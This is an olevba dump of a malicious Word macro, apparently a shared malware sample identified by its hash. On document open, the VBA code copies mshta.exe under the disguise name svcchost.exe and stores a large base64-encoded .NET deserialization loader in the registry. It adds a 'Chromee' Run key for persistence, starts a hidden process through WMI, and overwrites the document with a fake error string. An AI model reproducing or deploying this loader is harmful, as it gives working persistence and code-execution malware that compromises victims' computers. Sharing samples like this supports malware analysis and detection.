## Uploaded by @JohnLaTwC
## Sample hash: d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812

olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
MHT:MASIHBD- d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812.doc
===============================================================================
FILE: d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812.doc
Type: MHTML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: None - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function addData()
    Dim data As String
    app = app & "VVFVTklSVVJmVUZKUFEwVlRVd0JEVWtWQlZFVmZVRkpQVkVWRFZFVkVYMUJTVDBORlUxTUFSRVZDVlVkZiIKcyA9IHMgJiAiVUZK"
    app = app & "UFEwVlRVd0JFUlVKVlIxOVBUa3haWDFSSVNWTmZVRkpQUTBWVFV3Qk5SVTFmUTA5TlRVbFVBRU5TUlVGVVJWOVZUa2xEVDBSRiIK"
    app = app & "cyA9IHMgJiAiWDBWT1ZrbFNUMDVOUlU1VUFFVllWRVZPUkVWRVgxTlVRVkpVVlZCSlRrWlBYMUJTUlZORlRsUUFSMFZVWDBOUFRs"
    app = app & "UkZXRlFBVTBWVSIKcyA9IHMgJiAiWDBOUFRsUkZXRlFBUTFKRlFWUkZYMDVQWDFkSlRrUlBWd0JrZDFnQVNVNUlSVkpKVkY5UVFW"
    app = app & "SkZUbFJmUVVaR1NVNUpWRmtBWkhkWiIKcyA9IHMgJiAiQUhaaGJIVmxYMThBWkhkRVlYUmhBRk5sZEZGMWIzUmhBR05pQUcxelky"
    app = app & "OXliR2xpQUZkcGJrVjRaV01BVm1seWRIVmhiRUZzYkc5aiIKcyA9IHMgJiAiQUdkbGRGOUpaQUJzY0ZSb2NtVmhaRWxrQUdSM1ZH"
    app = app & "aHlaV0ZrU1dRQVpIZFFjbTlqWlhOelNXUUFSMlYwVUhKdlkyVnpjMEo1U1dRQSIKcyA9IHMgJiAiVm1seWRIVmhiRTFsYlc5eWVW"
    app = app & "SmxZV1FBVTNWemNHVnVaRlJvY21WaFpBQlNaWE4xYldWVWFISmxZV1FBUTNKbFlYUmxWR2h5WldGayIKcyA9IHMgJiAiQUdoVWFI"
    app = app & "SmxZV1FBVDNCbGJsUm9jbVZoWkFCUWNtOWpaWE56VkdoeVpXRmtBR3h3VW1WelpYSjJaV1FBWTIxa0FGSmxjR3hoWTJVQSIKcyA9"
    app = app & "IHMgJiAiVm1seWRIVmhiRVp5WldVQVJIVndiR2xqWVhSbFNHRnVaR3hsQUdoSVlXNWtiR1VBWWtsdWFHVnlhWFJJWVc1a2JHVUFi"
    app = app & "SEJVYVhScyIKcyA9IHMgJiAiWlFCblpYUmZUV0ZwYmsxdlpIVnNaUUJRY205alpYTnpUVzlrZFd4bEFHZGxkRjlHYVd4bFRtRnRa"
    app = app & "UUJzY0VGd2NHeHBZMkYwYVc5dSIKcyA9IHMgJiAiVG1GdFpRQkpjRU50WkV4cGJtVUFaMlYwWDBOdmJXMWhibVJNYVc1bEFHeHdR"
    app = app & "Mjl0YldGdVpFeHBibVVBWkhkR2NtVmxWSGx3WlFCVyIKcyA9IHMgJiAiWVd4MVpWUjVjR1VBWm14QmJHeHZZMkYwYVc5dVZIbHda"
    app = app & "UUJVWlhKdGFXNWhkR1VBVm1seWRIVmhiRTFsYlc5eWVWZHlhWFJsQUVkMSIKcyA9IHMgJiAiYVdSQmRIUnlhV0oxZEdVQVJHVmlk"
    app = app & "V2RuWVdKc1pVRjBkSEpwWW5WMFpRQkRiMjFXYVhOcFlteGxRWFIwY21saWRYUmxBRUZ6YzJWdCIKcyA9IHMgJiAiWW14NVZHbDBi"
    app = app & "R1ZCZEhSeWFXSjFkR1VBUVhOelpXMWliSGxVY21Ga1pXMWhjbXRCZEhSeWFXSjFkR1VBWkhkR2FXeHNRWFIwY21saSIKcyA9IHMg"
    app = app & "JiAiZFhSbEFFRnpjMlZ0WW14NVJtbHNaVlpsY25OcGIyNUJkSFJ5YVdKMWRHVUFRWE56WlcxaWJIbERiMjVtYVdkMWNtRjBhVzl1"
    app = app & "UVhSMCIKcyA9IHMgJiAiY21saWRYUmxBRUZ6YzJWdFlteDVSR1Z6WTNKcGNIUnBiMjVCZEhSeWFXSjFkR1VBUm14aFozTkJkSFJ5"
    app = app & "YVdKMWRHVUFRMjl0Y0dscyIKcyA9IHMgJiAiWVhScGIyNVNaV3hoZUdGMGFXOXVjMEYwZEhKcFluVjBaUUJCYzNObGJXSnNlVkJ5"
    app = app & "YjJSMVkzUkJkSFJ5YVdKMWRHVUFRWE56WlcxaSIKcyA9IHMgJiAiYkhsRGIzQjVjbWxuYUhSQmRIUnlhV0oxZEdVQVFYTnpaVzFp"
    app = app & "YkhsRGIyMXdZVzU1UVhSMGNtbGlkWFJsQUZKMWJuUnBiV1ZEYjIxdyIKcyA9IHMgJiAiWVhScFltbHNhWFI1UVhSMGNtbGlkWFJs"
    app = app & "QUdSM1dGTnBlbVVBWkhkWlUybDZaUUJuWlhSZlUybDZaUUJoY21Ob1UybDZaUUJrZDFOMCIKcyA9IHMgJiAiWVdOclUybDZaUUJ1"
    app = app & "VTJsNlpRQmtkMU5wZW1VQVUzbHVZMmh5YjI1cGVtVUFjMmw2WlFCSmJtUmxlRTltQUVaeWIyMUNZWE5sTmpSVCIKcyA9IHMgJiAi"
    app = app & "ZEhKcGJtY0FVM1ZpYzNSeWFXNW5BRTFoY25Ob1lXd0FRV3hzQUd0bGNtNWxiRE15TG1Sc2JBQnNiMkZrWlhJdVpHeHNBRXh2WVdS"
    app = app & "VCIKcyA9IHMgJiAiYUdWc2JBQndZWEpoYlFCblpYUmZTWFJsYlFCVGVYTjBaVzBBUlc1MWJRQnNjRTUxYldKbGNrOW1RbmwwWlhO"
    app = app & "WGNtbDBkR1Z1QUZGMSIKcyA9IHMgJiAiWlhKNVRHbHRhWFJsWkVsdVptOXliV0YwYVc5dUFHeHdVSEp2WTJWemMwbHVabTl5YldG"
    app = app & "MGFXOXVBRk5sZEVsdVptOXliV0YwYVc5dSIKcyA9IHMgJiAiQUZGMVpYSjVTVzVtYjNKdFlYUnBiMjRBVm1seWRIVmhiRTFsYlc5"
    app = app & "eWVVOXdaWEpoZEdsdmJnQlRlWE4wWlcwdVVtVm1iR1ZqZEdsdiIKcyA9IHMgJiAiYmdCUWNtOWpaWE56VkdoeVpXRmtRMjlzYkdW"
    app = app & "amRHbHZiZ0JYYjNjMk5FUnBjMkZpYkdWWGIzYzJORVp6VW1Wa2FYSmxZM1JwYjI0QSIKcyA9IHMgJiAiVjI5M05qUlNaWFpsY25S"
    app = app & "WGIzYzJORVp6VW1Wa2FYSmxZM1JwYjI0QWJIQlRkR0Z5ZEhWd1NXNW1id0JhWlhKdkFHeHdSR1Z6YTNSdiIKcyA9IHMgJiAiY0FC"
    app = app & "c2NGTjBZWEowUVdSa2NnQnNiMkZrWlhJQWJIQkNkV1ptWlhJQVZHOU1iM2RsY2dCb1UzUmtSWEp5YjNJQUxtTjBiM0lBTG1OaiIK"
    app = app & "cyA9IHMgJiAiZEc5eUFFbHVkRkIwY2dCd2RISUFVM2x6ZEdWdExrUnBZV2R1YjNOMGFXTnpBR2RsZEY5VWFISmxZV1J6QUdSM1RX"
    app = app & "bHNiR2x6WldOdiIKcyA9IHMgJiAiYm1SekFGTjVjM1JsYlM1U2RXNTBhVzFsTGtsdWRHVnliM0JUWlhKMmFXTmxjd0JUZVhOMFpX"
    app = app & "MHVVblZ1ZEdsdFpTNURiMjF3YVd4bCIKcyA9IHMgJiAiY2xObGNuWnBZMlZ6QUVSbFluVm5aMmx1WjAxdlpHVnpBR0pKYm1obGNt"
    app = app & "bDBTR0Z1Wkd4bGN3QnNjRlJvY21WaFpFRjBkSEpwWW5WMCIKcyA9IHMgJiAiWlhNQWJIQlFjbTlqWlhOelFYUjBjbWxpZFhSbGN3"
    app = app & "QlFjbTlqWlhOelEzSmxZWFJwYjI1R2JHRm5jd0JrZDBOeVpXRjBhVzl1Um14aCIKcyA9IHMgJiAiWjNNQVVISnZZMlZ6YzBGalky"
    app = app & "VnpjMFpzWVdkekFHUjNSbXhoWjNNQVpIZFlRMjkxYm5SRGFHRnljd0JrZDFsRGIzVnVkRU5vWVhKeiIKcyA9IHMgJiAiQUZSbGMz"
    app = app & "UkRiR0Z6Y3dCVWFISmxZV1JCWTJObGMzTUFaSGRFWlhOcGNtVmtRV05qWlhOekFFTnlaV0YwWlZCeWIyTmxjM01BYUZCeSIKcyA9"
    app = app & "IHMgJiAiYjJObGMzTUFSMlYwUTNWeWNtVnVkRkJ5YjJObGMzTUFiSEJDWVhObFFXUmtjbVZ6Y3dCc2NFRmtaSEpsYzNNQWJIQlRk"
    app = app & "R0Z5ZEVGayIKcyA9IHMgJiAiWkhKbGMzTUFWMkZwZEVadmNsTnBibWRzWlU5aWFtVmpkQUJKYm1wbFkzUUFiSEJtYkU5c1pGQnli"
    app = app & "M1JsWTNRQVpteFFjbTkwWldOMCIKcyA9IHMgJiAiQUdac1RtVjNVSEp2ZEdWamRBQkZlR2wwQUd4d1JXNTJhWEp2Ym0xbGJuUUFV"
    app = app & "M1JoY25RQVEyOXVkbVZ5ZEFCb1UzUmtTVzV3ZFhRQSIKcyA9IHMgJiAiYUZOMFpFOTFkSEIxZEFCM1UyaHZkMWRwYm1SdmR3QnVR"
    app = app & "MjFrVTJodmR3QldhWEowZFdGc1FXeHNiMk5GZUFCV2FYSjBkV0ZzVUhKdiIKcyA9IHMgJiAiZEdWamRFVjRBRU52Y0hrQVYzSnBk"
    app = app & "R1ZRY205alpYTnpUV1Z0YjNKNUFHeHdRM1Z5Y21WdWRFUnBjbVZqZEc5eWVRQUFBQUFSY3dCNSIKcyA9IHMgJiAiQUhNQWR3QnZB"
    app = app & "SGNBTmdBMEFBQVJjd0I1QUhNQWRBQmxBRzBBTXdBeUFBQUFBQUNONm5ocGpFYkRRcDFRcWE5UjZTMUlBQVFnQVFFSSIKcyA9IHMg"
    app = app & "JiAiQXlBQUFRVWdBUUVSRVFRZ0FRRU9CQ0FCQVFJREJ3RVlBZ1lZRHdjSkhRVVJHQkVVR0JnSkVrRVlEZ01BQUFnRkFBRWRCUTRG"
    app = app & "QUFFUyIKcyA9IHMgJiAiV1FnRUlBQVNRUVVnQVJKZENBTWdBQWdEQUFBT0JDQUJDQU1FSUFFT0NBUUFBQkpaQkNBQUVta0RJQUFP"
    app = app & "QlNBQ0RnNE9CZ0FDRWxrTyIKcyA9IHMgJiAiRGdRQUFRRUlDQWNGSFFVWUNSZ09DQUFFQVIwRkNCZ0lDTGQ2WEZZWk5PQ0pCUDhQ"
    app = app & "SHdBRUFRQUFBQVFDQUFBQUJBZ0FBQUFFRUFBQSIKcyA9IHMgJiAiQUFRZ0FBQUFCRUFBQUFBRWdBQUFBQVFBQVFBQUJBQUNBQUFF"
    app = app & "QUFRQUFBUUFFQUFBQkFBQUVBQUVBQUFBQUFRQUFBQUJCQUFBQUFRRSIKcyA9IHMgJiAiQUFBQUNBUUFBQVFBQkFBQUFBSUVCQUFB"
    app = app & "QUFRQUFBZ0FCQUFBQVFBQ0Jna0RCaEVNQXdZUkVBSUdEZ0lHQmdJR0NBTUdFUndHSUFNQiIKcyA9IHMgJiAiRGc0SUJTQUNBUTRJ"
    app = app & "QlFBQ0NnNElCUUFCQWhBWUJBQUJBaGdIQUFRWUdBa0pDUVlBQXdJWUNRa0tBQVlZQ1FrWUdBa1FDUVVBQWdrWSIKcyA9IHMgJiAi"
    app = app & "Q1FjQUF4Z1JIQUlJQ2dBRkFoZ1lIUVVJRUJnR0FBTVlHQmdZQ0FBRkdCZ1lDQWtKQ1FBRkFoZ1lDQWtRQ1JJQUNnSU9EaGdZQWhF"
    app = app & "USIKcyA9IHMgJiAiR0E0UUVSZ1FFUlFFQUFFSkdBTUFBQUVJQVFBSUFBQUFBQUFlQVFBQkFGUUNGbGR5WVhCT2IyNUZlR05sY0hS"
    app = app & "cGIyNVVhSEp2ZDNNQiIKcyA9IHMgJiAiQ0FFQUFnQUFBQUFBQ3dFQUJteHZZV1JsY2dBQUJRRUFBQUFBRndFQUVrTnZjSGx5YVdk"
    app = app & "b2RDRENxU0FnTWpBeE53QUFLUUVBSkRVNSIKcyA9IHMgJiAiWVdReE5XUXlMVFl5T0RBdE5EQmtOQzFpTXpBMkxUUTVZMkl3WW1W"
    app = app & "aU16SmtNQUFBREFFQUJ6RXVNQzR3TGpBQUFBVUJBQUVBQUFBQSIKcyA9IHMgJiAiQUFBQUFMcTNkbGtBQUFBQUFnQUFBQndCQUFC"
    app = app & "SU9BQUFTQm9BQUZKVFJGTm83d1FFNXBYY1Q0bnF3azdaSXowc0FRQUFBRVU2WEhCeSIKcyA9IHMgJiAiYVhaY1puSmhiV1YzYjNK"
    app = app & "clhHTnZaR1ZjZEc5dmJITmNaWGhsTW1welhHeHZZV1JsY2x4dlltcGNVbVZzWldGelpWeHNiMkZrWlhJdSIKcyA9IHMgJiAiY0dS"
    app = app & "aUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIK"
    app = app & "cyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBakRrQUFB"
    app = app & "QUFBQUFBQUFBQXBqa0FBQUFnQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUpnNUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFYME52Y2tSc2JFMWhhVzRBYlhOamIzSmxaUzVrYkd3QUFBQUFBUDhsQUNBQSIKcyA9IHMgJiAiRUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUJBQUFBQVlBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUVBQUFBdyIKcyA9"
    app = app & "IHMgJiAiQUFDQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQklBQUFBV0VBQUFBd0RBQUFBQUFBQUFBQUFBQXdETkFBQUFGWUFV"
    app = app & "d0JmQUZZQSIKcyA9IHMgJiAiUlFCU0FGTUFTUUJQQUU0QVh3QkpBRTRBUmdCUEFBQUFBQUM5Qk8vK0FBQUJBQUFBQVFBQUFBQUFB"
    app = app & "QUFCQUFBQUFBQS9BQUFBQUFBQSIKcyA9IHMgJiAiQUFRQUFBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQVJBQUFBQUVBVmdCaEFISUFS"
    app = app & "Z0JwQUd3QVpRQkpBRzRBWmdCdkFBQUFBQUFrQUFRQSIKcyA9IHMgJiAiQUFCVUFISUFZUUJ1QUhNQWJBQmhBSFFBYVFCdkFHNEFB"
    app = app & "QUFBQUFBQXNBUnNBZ0FBQVFCVEFIUUFjZ0JwQUc0QVp3QkdBR2tBYkFCbCIKcyA9IHMgJiAiQUVrQWJnQm1BRzhBQUFCSUFnQUFB"
    app = app & "UUF3QURBQU1BQXdBREFBTkFCaUFEQUFBQUFhQUFFQUFRQkRBRzhBYlFCdEFHVUFiZ0IwQUhNQSIKcyA9IHMgJiAiQUFBQUFBQUFJ"
    app = app & "Z0FCQUFFQVF3QnZBRzBBY0FCaEFHNEFlUUJPQUdFQWJRQmxBQUFBQUFBQUFBQUFOZ0FIQUFFQVJnQnBBR3dBWlFCRSIKcyA9IHMg"
    app = app & "JiAiQUdVQWN3QmpBSElBYVFCd0FIUUFhUUJ2QUc0QUFBQUFBR3dBYndCaEFHUUFaUUJ5QUFBQUFBQXdBQWdBQVFCR0FHa0FiQUJs"
    app = app & "QUZZQSIKcyA9IHMgJiAiWlFCeUFITUFhUUJ2QUc0QUFBQUFBREVBTGdBd0FDNEFNQUF1QURBQUFBQTJBQXNBQVFCSkFHNEFkQUJs"
    app = app & "QUhJQWJnQmhBR3dBVGdCaCIKcyA9IHMgJiAiQUcwQVpRQUFBR3dBYndCaEFHUUFaUUJ5QUM0QVpBQnNBR3dBQUFBQUFFZ0FFZ0FC"
    app = app & "QUV3QVpRQm5BR0VBYkFCREFHOEFjQUI1QUhJQSIKcyA9IHMgJiAiYVFCbkFHZ0FkQUFBQUVNQWJ3QndBSGtBY2dCcEFHY0FhQUIw"
    app = app & "QUNBQXFRQWdBQ0FBTWdBd0FERUFOd0FBQUNvQUFRQUJBRXdBWlFCbiIKcyA9IHMgJiAiQUdFQWJBQlVBSElBWVFCa0FHVUFiUUJo"
    app = app & "QUhJQWF3QnpBQUFBQUFBQUFBQUFQZ0FMQUFFQVR3QnlBR2tBWndCcEFHNEFZUUJzQUVZQSIKcyA9IHMgJiAiYVFCc0FHVUFiZ0Jo"
    app = app & "QUcwQVpRQUFBR3dBYndCaEFHUUFaUUJ5QUM0QVpBQnNBR3dBQUFBQUFDNEFCd0FCQUZBQWNnQnZBR1FBZFFCaiIKcyA9IHMgJiAi"
    app = app & "QUhRQVRnQmhBRzBBWlFBQUFBQUFiQUJ2QUdFQVpBQmxBSElBQUFBQUFEUUFDQUFCQUZBQWNnQnZBR1FBZFFCakFIUUFWZ0JsQUhJ"
    app = app & "QSIKcyA9IHMgJiAiY3dCcEFHOEFiZ0FBQURFQUxnQXdBQzRBTUFBdUFEQUFBQUE0QUFnQUFRQkJBSE1BY3dCbEFHMEFZZ0JzQUhr"
    app = app & "QUlBQldBR1VBY2dCeiIKcyA9IHMgJiAiQUdrQWJ3QnVBQUFBTVFBdUFEQUFMZ0F3QUM0QU1BQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFB"
    app = app & "d0FBQU1BQUFBdURrQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIK"
    app = app & "cyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9"
    app = app & "IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQVEwQUFBQUVBQUFBQ1JjQUFBQUpCZ0FBQUFrV0FBQUFCaG9BQUFBblUzbHpk"
    app = app & "R1Z0TGxKbFpteGxZM1JwYjI0dSIKcyA9IHMgJiAiUVhOelpXMWliSGtnVEc5aFpDaENlWFJsVzEwcENBQUFBQW9MIgplbnRyeV9j"
    app = app & "bGFzcyA9ICJUZXN0Q2xhc3MiCkRpbSBmbXQsIGFsLCBkLCBvClNldCBmbXQgPSBDcmVhdGVPYmplY3QoIlN5c3RlbS5SdW50aW1l"
    app = app & "LlNlcmlhbGl6YXRpb24uRm9ybWF0dGVycy5CaW5hcnkuQmluYXJ5Rm9ybWF0dGVyIikKU2V0IGFsID0gQ3JlYXRlT2JqZWN0KCJT"
    app = app & "eXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0IikKYWwuQWRkIGZtdC5TdXJyb2dhdGVTZWxlY3RvcgpTZXQgZCA9IGZtdC5EZXNl"
    app = app & "cmlhbGl6ZV8yKEJhc2U2NFRvU3RyZWFtKHMpKQpTZXQgbyA9IGQuRHluYW1pY0ludm9rZShhbC5Ub0FycmF5KCkpLkNyZWF0ZUlu"
    app = app & "c3RhbmNlKGVudHJ5X2NsYXNzKQpEaW0gb2JqU2hlbGwsc2hsClNldCBvYmpTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5T"
    app = app & "aGVsbCIpCnNobCA9IHNobCAmIG9ialNoZWxsLlJlZ1JlYWQoIkhLQ1VcU29mdHdhcmVcQXBwRGF0YUxvd1xEYXRhQXBwXERhdGEi"
    app = app & "KSAKby5Mb2FkU2hlbGwgc2hsLCA0CkVuZCBTdWIKU2V0VmVyc2lvbgonT24gRXJyb3IgUmVzdW1lIE5leHQKUnVuCg=="


    Dim decode
    decode = Base64Decode(app)
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.RegWrite "HKCU\Software\AppDataLow\DataApp\App", decode, "REG_SZ"
    
End Function
Function checkEnviroment()
    Dim arcPath As String
    arcPath = arcPath & "C:\\Windows\\SysWOW64"
    If dirExists(arcPath) = True Then
        FileCopy "C:\Windows\SysWOW64\mshta.exe", "C:\ProgramData\svcchost.exe"
    Else
        FileCopy "C:\Windows\System32\mshta.exe", "C:\ProgramData\svcchost.exe"
    End If
End Function

Function addKeyApp()
    Dim key, decodeKey
    key = key & "QzpcUHJvZ3JhbURhdGFcc3ZjY2hvc3QuZXhlIHZic2NyaXB0OmV4ZWN1dGUoIk9uIEVycm9yIFJlc3VtZSBOZXh0OnNldCBXID0g"
    key = key & "Q3JlYXRlT2JqZWN0KCIiV1NjcmlwdC5TaGVsbCIiKTpzPSIiIiI6bSA9IFcuUmVnUmVhZCgiIkhLQ1VcU29mdHdhcmVcQXBwRGF0"
    key = key & "YUxvd1xEYXRhQXBwXEFwcCIiKTpleGVjdXRlKG0pOmNvZGUgY2xvc2UiKQ=="


    decodeKey = Base64Decode(key)
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Chromee", decodeKey, "REG_SZ"
End Function
Function runApp()
    Dim key
    Dim myWS As Object
    Set myWS = CreateObject("WScript.Shell")
    key = myWS.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Chromee")
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
    errReturn = objProcess.Create(key, Null, objConfig, intProcessID)
End Function

Function Base64Decode(ByVal base64String)
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin
  
  base64String = Replace(base64String, vbCrLf, "")
  base64String = Replace(base64String, vbTab, "")
  base64String = Replace(base64String, " ", "")
  
  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, "Base64Decode", "Bad Base64 string."
    Exit Function
  End If

  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3

      thisChar = Mid(base64String, groupBegin + CharCounter, 1)

      If thisChar = "=" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
        Exit Function
      End If

      nGroup = 64 * nGroup + thisData
    Next
    
    nGroup = Hex(nGroup)
    
    nGroup = String(6 - Len(nGroup), "0") & nGroup
    
    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 5, 2)))
    
    sOut = sOut & Left(pOut, numDataBytes)
  Next

  Base64Decode = sOut
End Function
Function dirExists(s_directory As String) As Boolean
    Set OFSO = CreateObject("Scripting.FileSystemObject")
    dirExists = OFSO.FolderExists(s_directory)
End Function
Function IsProcessRunning(strComputer, strProcess)
    Dim Process, strObject
    IsProcessRunning = False
    strObject = "winmgmts://" & strComputer
    For Each Process In GetObject(strObject).InstancesOf("win32_process")
    If UCase(Process.Name) = UCase(strProcess) Then
        IsProcessRunning = True
        Exit Function
    End If
    Next
End Function
Function ReplaceDocument()
    ActiveDocument.Range.Delete
    ActiveDocument.Range.Text = "Errx000000762EMSF"
    ActiveDocument.Save
End Function
Sub Main()
    checkEnviroment
    addApp
    addData
    addKeyApp
    runApp
End Sub
Private Sub Document_Open()
    Dim strComputer, strProcess
    strComputer = "."
    strProcess = "svcchost.exe"
    If IsProcessRunning(strComputer, strProcess) = False Then
        ReplaceDocument
        Main
    End If
End Sub

## Contents of HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Chromee

